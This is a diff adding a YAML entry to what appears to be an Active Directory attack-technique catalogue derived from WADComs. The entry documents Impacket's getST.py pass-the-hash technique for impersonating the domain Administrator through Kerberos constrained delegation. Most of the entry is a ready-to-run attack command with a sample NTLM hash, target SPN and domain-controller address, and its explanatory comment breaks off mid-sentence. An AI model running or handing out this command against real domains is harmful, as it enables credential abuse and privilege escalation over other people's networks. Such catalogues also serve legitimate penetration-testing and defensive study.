@@ -1,0 +1,35 @@
+id: wadcoms/impacket-getst-hash
+type: technique
+platform: active-directory
+name: Impacket getST Hash
+phases:
+- execution
+- privilege-escalation
+- persistence
+capabilities:
+- command-execution
+- privilege-escalation
+- persistence
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- an NTLM hash (pass-the-hash)
+- a valid username
+commands:
+- template: python3 getST.py -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7 -spn www/server01.test.local -dc-ip
+    10.10.10.1 -impersonate Administrator test.local/john
+  comment: Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has
+    constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf
+    of another user. The following command will impersonate the Administrator account using
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py
+- http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
+tags:
+- active-directory
+- wadcoms
+- kerberos
